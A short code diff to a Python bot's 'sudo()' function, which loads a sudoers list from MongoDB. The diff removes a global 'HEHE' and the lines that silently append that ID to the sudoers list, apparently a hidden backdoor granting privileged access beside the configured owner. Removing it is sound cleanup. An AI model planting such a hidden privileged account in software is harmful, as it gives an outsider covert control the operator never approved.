@@ -43,7 +43,7 @@ def dbb():
 
 
 def sudo():
-    global SUDOERS, HEHE
+    global SUDOERS
     OWNER = config.OWNER_ID
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
@@ -57,8 +57,6 @@ def sudo():
                 {"$set": {"sudoers": sudoers}},
                 upsert=True,
             )
-        elif int(HEHE) not in sudoers:
-            sudoers.append(int(HEHE))
     if sudoers:
         for x in sudoers:
             SUDOERS.add(x)
